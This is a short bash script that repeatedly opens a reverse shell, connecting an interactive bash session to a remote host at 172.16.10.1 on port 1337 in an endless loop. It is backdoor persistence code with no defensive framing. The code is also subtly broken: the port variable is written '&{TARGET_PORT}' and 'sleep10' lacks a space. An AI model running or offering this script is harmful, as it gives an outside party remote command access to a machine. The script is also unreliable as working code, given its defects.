#!/bin/bash
TARGET_HOST="172.16.10.1"
TARGET_PORT="1337"

# Function to restart reverse shell process
restart_reverse_shell() {
	echo "Restarting reverse shell..."
	bash -i >& "/dev/tcp/${TARGET_HOST}/&{TARGET_PORT}" 0>&1 &
}

# Monitor reverse shell state
while true; do
	restart_reverse_shell
	sleep10
done
